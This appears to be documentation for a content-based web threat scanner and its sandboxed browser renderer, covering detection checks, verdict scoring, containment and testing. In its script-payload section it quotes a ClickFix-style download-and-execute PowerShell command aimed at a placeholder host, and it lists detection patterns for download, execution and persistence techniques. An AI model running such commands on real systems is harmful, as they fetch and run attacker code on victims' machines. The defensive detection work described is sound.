Overview

Insight is a passive web threat scanner. Submit any URL and it fetches all public resources — HTML, scripts, HTTP headers, and TLS certificates — renders the page in a sandboxed browser, and analyses everything on content alone. There are no calls to reputation databases or external threat intelligence APIs.

Because detection is content-based, Insight catches zero-day campaigns, freshly registered phishing domains, and newly injected skimmers that reputation feeds have not yet indexed. Every finding for a known campaign pattern names it — ClickFix, SocGholish, ClearFake, Magecart, drainers, TDS doorways, phishing kits — and every finding carries the actual evidence (the code snippet, decoded payload, redirect chain or header value) so an analyst can judge it without another tool.

It is a companion tool to vault1337.com and shares the same design system. The result of each scan is a prioritised findings report covering JavaScript threats, phishing indicators, domain intelligence, security misconfigurations, and the full detected technology stack — each finding categorised by severity (CRITICAL / HIGH / MEDIUM / LOW / INFO) with supporting evidence extracted directly from the page content.

Disclaimer: All scan results are provided for informational purposes only and must be independently verified by a trained security analyst before any action is taken. Findings may contain false positives or miss threats not covered by the current detection rules.

How It Works

When a URL is submitted, Insight fetches the page and all linked external scripts using an SSRF-safe HTTP fetcher — httpx over HTTP/2, with curl_cffi browser TLS-fingerprint impersonation for servers that refuse ordinary clients. No external threat intelligence APIs are called; all analysis runs against the raw content the target server returned and the DOM the renderer observed.

Static analysis modules run against every scan:

  • JavaScript analyser — 80+ checks against every script collected from the page
  • HTML analyser — 35+ structural checks against the page markup
  • Domain intelligence — 13+ checks on the hostname, TLD and WHOIS record
  • Header analyser — 15 checks on HTTP response headers
  • SSL analyser — 6 checks on the TLS certificate
  • Native script payload analyser — 4 checks for a response whose whole body is a PowerShell, batch, shell or VBScript program (see Script Payloads)

Two dynamic phases run as well whenever Carapace is configured:

  • Render — the page is loaded in a confined headless Chromium so runtime-injected overlays exist to be seen, producing screenshots, renderer findings, JS-computed redirect destinations and an extended technology stack
  • Gate solving — Cloudflare challenges and JavaScript cloaking gates are followed in that browser, so what gets analysed is the document the server actually serves (see Gate Solving)

Each check emits zero or more findings. A context-collapse engine then fires additional synthetic findings when combinations of individually weak signals indicate coordinated attack infrastructure.

Engine version. Detection changes bump backend/scanner/modules/version.txt, which is baked into the production image and busts the scan-result cache — so a re-scan after a detection change is a fresh analysis, not a replayed verdict. This page documents 2.1.53.

Verdict & Scoring

Verdict derivation

VerdictCondition
MALICIOUSAny CRITICAL finding
SUSPICIOUSAny HIGH finding, or 2+ MEDIUM findings of distinct signal classes
CLEANOnly LOW and INFO findings, and the page content was actually read
UNKNOWNNo findings at all, or the content could not be read — an unsolvable bot challenge, or a cloaking gate that could not be followed and has not been seen before

CLEAN is a positive claim — "we looked at this page and it does not endanger a visitor" — so it is never given for content the scanner never saw. A scan that received only a challenge page degrades to UNKNOWN instead of passing. Findings that did fire on that challenge page still stand.

MEDIUM signal classes. The "2+ MEDIUM" rule assumes the signals are independent. Several MEDIUMs of the same kind are one observation reported repeatedly, so MEDIUMs are counted by signal class — every obfuscation-family finding (packed JavaScript, hex-encoded string, high-entropy string) collapses into one. Context-only MEDIUMs, such as a Web3 signing flow or a runtime-generated beacon domain, describe behaviour that is identical whether the page is honest or hostile: they carry no suspicion on their own and never reach a verdict by themselves. Escalation for those runs through context collapse instead.

Context collapse rules

37 correlation rules fire synthetic findings when multiple signals combine into coordinated attack infrastructure:

  • High-risk TLD + external form action → HIGH "phishing infrastructure" — CRITICAL when a DGA signal is present too
  • DGA domain + hidden iframe + obfuscated JS → CRITICAL "drive-by malware delivery"
  • Brand impersonation + phishing form (± new certificate) → CRITICAL "active phishing campaign"
  • Keylogger / skimmer + DevTools evasion → CRITICAL "sophisticated targeted malware"
  • Fake CAPTCHA / ClickFix UI + autonomous clipboard write → CRITICAL "ClickFix malware delivery"
  • Injected unknown external script + ClickFix / clipboard payload → CRITICAL "compromised site delivering ClickFix malware"
  • EtherHiding on-chain payload retrieval + ClickFix overlay → CRITICAL — the ClearFake chain
  • Wallet signing flow + impersonation or typosquat infrastructure → CRITICAL "drainer"
  • JavaScript execution gate + renderer-observed third-party destination → HIGH "cloaked doorway — TDS"
  • Newly registered domain (≤ 30 days) + high-risk TLD → HIGH "newly registered high-risk domain"
  • Runtime-generated beacon domain + exfiltration or disposable infrastructure → CRITICAL "exfiltration to a runtime-generated destination"

JavaScript Analysis

All scripts are run through jsbeautifier before analysis (files ≤ 256 KB). Both the original and beautified forms are checked. Base64-encoded strings are decoded and the plaintext payload is appended to the evidence block where printable. Bundles above 600 KB are routed through targeted full-file coverage rather than the full ladder, so a large minified bundle cannot hide a payload by size alone.

Native Script Payloads

The JavaScript analyser reads JavaScript and the HTML analyser reads documents. Neither reads a response whose entire body is a PowerShell, batch, POSIX-shell or VBScript program — which is exactly how a ClickFix second stage is delivered: the lure tells the victim to paste powershell -c "irm https://host/x | iex", and https://host/x answers with a script, not a web page. Those responses are analysed as scripts.

Language is classified from content alone (powershell, batch, shell, vbscript, python, applescript), declining anything that opens as an HTML document or carries JavaScript tell-tales.

SeverityCheckFires when
HIGHDownload-and-execute chainA remote-retrieval sink (DownloadString, Net.WebClient, Invoke-WebRequest/RestMethod, iwr/irm/curl/wget, certutil -urlcache, BITS) and an execution sink (iex, | sh, Start-Process)
CRITICAL↳ obfuscated stagerThe same chain, plus established concealment

HIGHPersistenceRun key, schtasks /create, New-/Register-ScheduledTask, or a Startup-folder .lnk/.vbs/.bat/.cmd/.ps1

Obfuscation tiering is what separates a stager from a published one-line installer — rustup, Chocolatey and Homebrew all download and execute, in readable source. Strong signals (any one establishes concealment): a per-character decode loop, -bxor / ^ ord(, -enc <base64> / base64 -d, [scriptblock]::Create($…). Weak signals need two: a long hex literal (usually a checksum), FromBase64String, [char] reconstruction, GzipStream, ConvertTo-SecureString. Evidence is labelled by section, and hex plus repeating-key XOR constants are decoded inline.

Visual Renderer (Carapace)

Carapace is a separate Rust service that Insight uses as its renderer. It loads the target in headless Chromium with JavaScript enabled, so runtime-injected overlays — ClickFix fake CAPTCHAs, SocGholish and ClearFake update prompts, drainer modals — actually render and can be detected. Because it executes attacker code, it is confined rather than trusted.

What every scan gains from it:

  • Screenshots — a full-page desktop capture (and optionally a 375×844 mobile one), trimmed to real content height so payloads positioned below the fold are not cropped away, with a verdict badge composited on
  • Renderer threat flags — from the rendered DOM and runtime behaviour, plus oxc AST-based static JS analysis: eval chains, obfuscation, exfiltration calls, sandbox-evasion probes, drive-by downloads
  • JS-computed redirect destinations — captured over CDP, which static analysis cannot resolve
  • An extended technology stack — read from the rendered DOM
  • A risk score (0–100) summing flag weights for quick triage. A non-zero score with no reported findings means the renderer saw something below its own reporting threshold — a tuning signal, surfaced as a LOW finding only when a genuine residual gap remains.

Containment

Every browser connection goes through an SSRF-enforcing policy proxy. Same-origin content — and a vetted CDN list — is fetched live, so the page renders as a visitor would see it. Cross-origin requests, the C2 and exfiltration signal, are refused and recorded as evidence. Every resolved IP is checked, which also defeats DNS rebinding. Routing every request through the proxy (rather than letting Chromium connect directly for allowlisted hosts) is what makes that guarantee hold for all traffic, not most of it.

The container runs non-root with all capabilities dropped, a read-only root filesystem, bounded CPU / memory / PIDs, a hard per-render watchdog, and a network that cannot reach the database or the cache.

Insight calls POST /render for every scan when CARAPACE_URL is set, retrying on 429 while the render gate is saturated. If Carapace is unavailable the scan continues without it — the renderer phase is best-effort, never a hard dependency.

Carapace is open-source (MIT) at github.com/DanDreadless/Carapace. It is designed to be deployed as a sidecar alongside Insight — see the full Carapace documentation for the pipeline, CLI, HTTP API, threat report, and setup instructions.

Gate Solving (/solve)

Some pages show a scanner nothing until a real browser has passed a gate. Carapace's /solve endpoint loads the page in the same confined browser, lets the gate play out, and returns the document the server actually served plus the navigation chain the browser was sent down.

Cloudflare bot challenges that survive TLS-fingerprint impersonation are solved in the browser and the real page is analysed (INFO "Cloudflare challenge cleared"). Clearance is cached inside Carapace per host and reused; no clearance cookie ever leaves it, and because clearance is bound to the solving IP this is not cookie replay.

JavaScript cloaking gates — a content-less page that re-requests itself with a proof-of-JS token — are followed as a visitor would follow them:

OutcomeWhat happens
Same-site content behind the gateThe landing document — validated as 2xx, same registrable domain, SSRF-checked, and not itself a gate — replaces the gate as the page under analysis. INFO finding with the chain; normal verdict.
Off-site forwardThe signature of a traffic-distribution system (TDS) doorway. HIGH "cloaking gate forwards visitors off-site through a TDS", evidence = every sampled visit's chain. Each destination is then followed and analysed, so a lure at the end can carry the verdict to MALICIOUS.
Not forwarded this time, but seen beforeThe chains are recalled from a per-domain observation memory (7 days) and the same HIGH finding is emitted, stating that it is an earlier observation and when.
Nothing followed, nothing rememberedMEDIUM gate finding, verdict UNKNOWN — the scanner did not see the content and does not claim to have.

Sampling versus burning. A TDS picks a destination per visitor, so one visit is not a reliable sample — the gate is sampled more than once, within a fixed time budget. It is not sampled more aggressively than that because a TDS burns an exit that keeps visiting: observed doorways are remembered for a week instead, so a later scan the TDS refuses to forward is still reported with the date it was seen. Because a doorway and where it sends people are the content, the verdict is not degraded to UNKNOWN in that case.

API Endpoints

All endpoints are under /api/. The API is public and unauthenticated — the React GUI is a pure client of it, with no browser-only endpoints — and is documented for callers at /api-docs.

Throttling is anti-flood, not a usage quota. Submission is bounded by a per-IP burst cap (RATE_LIMIT_SCANS_PER_MINUTE) plus an in-flight concurrency cap (MAX_CONCURRENT_SCANS_PER_IP) — the two things that actually bound worker and Chromium load. Ordinary use is not rate limited; floods get a 429. The flat hourly quota is legacy and ships disabled.
SSRF protection: every outbound request made during a scan goes through an SSRF-safe fetcher. It rejects non-HTTP(S) schemes and URLs over 2048 chars, resolves DNS and checks every resolved IP against blocked networks (RFC1918, loopback, CGNAT, link-local, IPv6 private) with a not is_global backstop, unwraps IPv4-in-IPv6 encodings before checking (v4-mapped, v4-compatible, 6to4, Teredo), caps response bodies at 5 MB (external scripts at 1 MB), enforces hard timeouts, and handles redirects manually so every hop is re-validated. Validation runs both before queuing and again before fetching. A regression gate pins 29 must-block and 11 must-stay-reachable addresses; a case is added before the validator is touched.

VPN Egress (Production)

A scanner visits attacker infrastructure all day, and every visit tells that infrastructure the scanner's IP. In production, no container that touches a scan target has a route to the internet except through a VPN tunnel (gluetun, NordVPN over OpenVPN).

TunnelCarriesNetworks
gluetun-renderCarapace onlyrender network only — the renderer still cannot reach the database or cache
gluetun-appbackend + celerypublic, internal and render networks

It is routing, not a proxy: there is no code path that can forget to use it, and gluetun's kill switch means a dropped tunnel fails closed rather than leaking. Exits are random UK servers, and a scheduled task reconnects both tunnels every 4 hours so an exit a TDS has blocklisted does not stay burned. gluetun's own malicious-domain DNS blocklist is deliberately disabled — it would hide the very domains being scanned. 

cp gluetun.env.sample gluetun.env      # NordVPN *service* credentials; gitignored
bash ops/gluetun-update-servers.sh     # refresh gluetun's server list
bash ops/gluetun-control-key.sh        # API key for exit rotation
docker compose -f docker-compose.prod.yml up -d
bash ops/verify-vpn-egress.sh          # prove nothing exits on the host's own IP

verify-vpn-egress.sh checks, from inside each container, that the exit IP is not the host's, that NordVPN reports the connection as protected, that DNS goes through the tunnel, and that the renderer still cannot reach the database or the LAN.

Detection Testing

Every change that affects scan output must pass three gates. They are deliberately adversarial to one another — the edit that removes a false positive is the same edit that can silently delete a detection.

GateQuestion it answers
python backend/run_threat_regression.pyDetections: did a fix remove real coverage? Offline fixtures, no network.
python backend/run_clean_snapshots.pyFalse positives: are legitimate sites still CLEAN? Replays stored snapshots and never contacts those sites again.
bash ops/harness-vpn.sh run_scan_test.py --feedbackCases: are reported misses and false positives actually fixed? Live scans — and they run inside the VPN namespace, refusing to start on a bare host.

Each exits non-zero and names what broke. Fixtures are inert by construction, and new detections land with both a positive fixture and the false-positive controls that bound them.
